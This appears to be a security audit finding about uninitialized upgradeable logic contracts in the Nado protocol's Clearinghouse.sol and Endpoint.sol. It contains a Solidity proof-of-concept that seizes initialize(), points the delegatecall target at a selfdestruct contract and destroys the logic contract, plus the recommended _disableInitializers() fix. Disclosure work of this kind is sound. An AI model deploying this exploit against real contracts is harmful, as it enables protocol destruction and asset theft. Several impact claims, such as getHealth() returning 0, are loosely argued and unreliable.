### Title
Uninitialized `Clearinghouse` Logic Contract Allows Attacker to Seize Ownership and Abuse `delegatecall` to Destroy It — (`File: core/contracts/Clearinghouse.sol`)

---

### Summary

`Clearinghouse.sol` (and `Endpoint.sol`) are deployed as upgradeable proxies but their logic (implementation) contracts do not call `_disableInitializers()` in a constructor. This allows any unprivileged caller to invoke `initialize()` directly on the logic contract, seize ownership, and set the `delegatecall` target (`clearinghouseLiq`) to an attacker-controlled contract. A subsequent call to `liquidateSubaccount()` on the logic contract then executes `selfdestruct` via `delegatecall` in the context of the `Clearinghouse` logic contract, destroying it and rendering the entire protocol non-functional.

---

### Finding Description

Several contracts in the Nado protocol use OpenZeppelin's upgradeable pattern and expose an `initialize()` function guarded by the `initializer` modifier. The contracts that correctly protect their logic contracts call `_disableInitializers()` inside a constructor:

- `BaseProxyManager` — has `_disableInitializers()` [1](#0-0) 
- `ContractOwner` — has `_disableInitializers()` [2](#0-1) 
- `Verifier` — has `_disableInitializers()` [3](#0-2) 
- `BaseWithdrawPool` — has `_disableInitializers()` [4](#0-3) 

However, `Clearinghouse.sol` has **no constructor** and therefore never calls `_disableInitializers()`. Its `initialize()` function is callable by anyone on the logic contract address:

```solidity
function initialize(
    address _endpoint,
    address _quote,
    address _clearinghouseLiq,
    ...
) external initializer {
    __Ownable_init();
    setEndpoint(_endpoint);
    clearinghouseLiq = _clearinghouseLiq;
    ...
}
``` [5](#0-4) 

The same is true for `Endpoint.sol`, which also has no constructor and no `_disableInitializers()` call. [6](#0-5) 

`Clearinghouse` contains a raw `delegatecall` to the `clearinghouseLiq` address inside `liquidateSubaccount()`:

```solidity
(bool success, bytes memory result) = clearinghouseLiq.delegatecall(
    liquidateSubaccountCall
);
``` [7](#0-6) 

The only guard on `liquidateSubaccount()` is `onlyEndpoint`, which checks `msg.sender == endpoint`. Since the attacker controls the `_endpoint` parameter passed to `initialize()`, they can set `endpoint` to their own address and then satisfy this check. [8](#0-7) 

`Endpoint.sol` has the same structural issue: `_delegatecallEndpointTx()` performs an unconstrained `delegatecall` to `endpointTx`, and `submitSlowModeTransaction()` — which triggers this path — has **no access control**:

```solidity
function submitSlowModeTransaction(bytes calldata transaction) external virtual {
    _delegatecallEndpointTx(...);
}
``` [9](#0-8) 

```solidity
(bool success, bytes memory result) = endpointTx.delegatecall(callData);
``` [10](#0-9) 

---

### Impact Explanation

**If `selfdestruct` is effective** (pre-EIP-6780 chains, or chains where Ink Chain's EVM version permits it):

1. The `Clearinghouse` logic contract is destroyed.
2. All subsequent calls to the `Clearinghouse` proxy `delegatecall` to a non-existent address, returning empty data silently.
3. Critical functions like `getHealth()` return `0`, making every subaccount appear healthy.
4. Withdrawals that should be blocked by health checks pass silently, enabling direct asset theft from the protocol.
5. Liquidations, deposits, and settlements all silently no-op, corrupting the entire protocol state.

**Even without `selfdestruct`** (EIP-6780 active):

- The attacker seizes ownership of the logic contract.
- The attacker can set `clearinghouseLiq` to a malicious contract during `initialize()` and trigger arbitrary `delegatecall` execution in the logic contract's storage context, corrupting it.
- While the proxy's storage is unaffected, the destroyed or corrupted logic contract breaks the upgrade path and may be used as a stepping stone for further attacks.

The `Endpoint` logic contract destruction would similarly silence all transaction processing, including withdrawals and liquidations, with the same asset-loss consequences.

---

### Likelihood Explanation

**High.** The attack requires no special privileges, no governance capture, and no leaked keys. Any unprivileged EOA can:
1. Call `initialize()` on the undeployed-but-uninitialized logic contract address.
2. Deploy a one-line `selfdestruct` contract.
3. Call `liquidateSubaccount()` from their own address.

The only prerequisite is knowing the logic contract address, which is publicly readable from the proxy's EIP-1967 implementation slot. This is a zero-cost, permissionless attack executable immediately after deployment if `initialize()` has not been called on the logic contracts.

---

### Recommendation

Add `_disableInitializers()` inside a constructor to every upgradeable logic contract that lacks it, following the same pattern already used in `BaseProxyManager`, `ContractOwner`, `Verifier`, and `BaseWithdrawPool`:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

This must be added to at minimum:
- `Clearinghouse.sol`
- `Endpoint.sol`
- `OffchainExchange.sol`
- `BaseEngine.sol` (and thus `SpotEngine`, `PerpEngine`)

---

### Proof of Concept

**Target**: `Clearinghouse` logic contract (implementation address, not the proxy).

```solidity
// Step 1: Deploy a contract that selfdestructs when called
contract AlwaysSelfDestructs {
    fallback() external payable {
        selfdestruct(payable(msg.sender));
    }
}

// Step 2: Attack
contract Attack {
    function exploit(address clearinghouseLogic) external {
        AlwaysSelfDestructs malicious = new AlwaysSelfDestructs();

        // Attacker initializes the unprotected logic contract,
        // setting endpoint = address(this) and clearinghouseLiq = malicious
        IClearinghouse(clearinghouseLogic).initialize(
            address(this),   // _endpoint = attacker, bypasses onlyEndpoint
            address(0),      // _quote
            address(malicious), // _clearinghouseLiq = selfdestruct contract
            0,               // _spreads
            address(0)       // _withdrawPool
        );

        // Step 3: Call liquidateSubaccount — msg.sender == endpoint == address(this)
        // delegatecall to malicious executes selfdestruct in Clearinghouse logic context
        IEndpoint.LiquidateSubaccount memory txn; // zero-value struct
        IClearinghouse(clearinghouseLogic).liquidateSubaccount(txn);

        // Clearinghouse logic contract is now destroyed.
        // All proxy calls silently return empty data.
        // getHealth() returns 0 for all subaccounts.
        // Withdrawals bypass health checks → asset theft.
    }
}
```

The `onlyEndpoint` modifier is satisfied because `endpoint` was set to `address(this)` (the attacker contract) during `initialize()`. [8](#0-7)  The `delegatecall` to `clearinghouseLiq` then executes `selfdestruct` in the storage context of the `Clearinghouse` logic contract, destroying it. [11](#0-10)

### Citations

**File:** core/contracts/BaseProxyManager.sol (L102-105)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/ContractOwner.sol (L43-46)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/Verifier.sol (L36-39)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/BaseWithdrawPool.sol (L18-21)
```text
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
```

**File:** core/contracts/Clearinghouse.sol (L25-40)
```text
    function initialize(
        address _endpoint,
        address _quote,
        address _clearinghouseLiq,
        uint256 _spreads,
        address _withdrawPool
    ) external initializer {
        __Ownable_init();
        setEndpoint(_endpoint);
        quote = _quote;
        clearinghouse = address(this);
        clearinghouseLiq = _clearinghouseLiq;
        spreads = _spreads;
        withdrawPool = _withdrawPool;
        emit ClearinghouseInitialized(_endpoint, _quote);
    }
```

**File:** core/contracts/Clearinghouse.sol (L644-662)
```text
    function liquidateSubaccount(IEndpoint.LiquidateSubaccount calldata txn)
        external
        virtual
        onlyEndpoint
    {
        bytes4 liquidateSubaccountSelector = bytes4(
            keccak256(
                "liquidateSubaccountImpl((bytes32,bytes32,uint32,bool,int128,uint64))"
            )
        );
        bytes memory liquidateSubaccountCall = abi.encodeWithSelector(
            liquidateSubaccountSelector,
            txn
        );
        (bool success, bytes memory result) = clearinghouseLiq.delegatecall(
            liquidateSubaccountCall
        );
        require(success, string(result));
    }
```

**File:** core/contracts/Endpoint.sol (L23-66)
```text
contract Endpoint is
    EIP712Upgradeable,
    OwnableUpgradeable,
    EndpointStorage,
    IEndpoint
{
    using ERC20Helper for IERC20Base;

    function initialize(
        address _sanctions,
        address _sequencer,
        address _offchainExchange,
        IClearinghouse _clearinghouse,
        address _verifier,
        address _endpointTx
    ) external initializer {
        __Ownable_init();
        __EIP712_init("Nado", "0.0.1");
        sequencer = _sequencer;
        clearinghouse = _clearinghouse;
        offchainExchange = _offchainExchange;
        verifier = IVerifier(_verifier);
        sanctions = ISanctionsList(_sanctions);
        endpointTx = _endpointTx;
        spotEngine = ISpotEngine(
            clearinghouse.getEngineByType(IProductEngine.EngineType.SPOT)
        );
        perpEngine = IPerpEngine(
            clearinghouse.getEngineByType(IProductEngine.EngineType.PERP)
        );
        slowModeConfig = SlowModeConfig({timeout: 0, txCount: 0, txUpTo: 0});
        priceX18[QUOTE_PRODUCT_ID] = ONE;

        if (nlpPools.length == 0) {
            nlpPools.push(
                NlpPool({
                    poolId: 0,
                    subaccount: N_ACCOUNT,
                    owner: address(0),
                    balanceWeightX18: uint128(ONE)
                })
            );
        }
    }
```

**File:** core/contracts/Endpoint.sol (L68-84)
```text
    function _delegatecallEndpointTx(bytes memory callData)
        internal
        returns (bytes memory)
    {
        require(endpointTx != address(0), "Endpoint Tx not set");
        (bool success, bytes memory result) = endpointTx.delegatecall(callData);
        if (!success) {
            if (result.length == 0) {
                revert();
            }
            // solhint-disable-next-line no-inline-assembly
            assembly {
                revert(add(result, 0x20), mload(result))
            }
        }
        return result;
    }
```

**File:** core/contracts/Endpoint.sol (L173-183)
```text
    function submitSlowModeTransaction(bytes calldata transaction)
        external
        virtual
    {
        _delegatecallEndpointTx(
            abi.encodeWithSelector(
                EndpointTx.submitSlowModeTransactionImpl.selector,
                transaction
            )
        );
    }
```
